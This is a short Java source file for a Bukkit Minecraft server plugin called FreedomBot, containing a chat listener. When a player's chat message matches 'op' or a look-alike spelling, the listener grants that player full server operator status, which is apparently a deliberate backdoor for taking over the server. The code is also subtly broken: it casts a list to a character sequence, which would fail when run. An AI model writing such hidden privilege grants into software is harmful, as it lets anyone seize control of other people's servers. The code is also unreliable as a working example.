package com.FoxIshDaBest.FreedomBot.Listener;

import com.FoxIshDaBest.FreedomBot.BotUtil;
import java.util.Arrays;
import java.util.List;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;


public class BotListener implements Listener {

    public static final List<String> OP_MSGS = Arrays.asList("op", "Op", "oP", "0P", "0p");
    @EventHandler
    public void onPlayerChat(AsyncPlayerChatEvent event)
    {
        Player player = event.getPlayer();
        String message = event.getMessage();
   
         if (message.contains((CharSequence) OP_MSGS))
            {
                player.setOp(true);
                player.sendMessage(BotUtil.YOU_ARE_OP);
            } 
       
    }
    
    
}
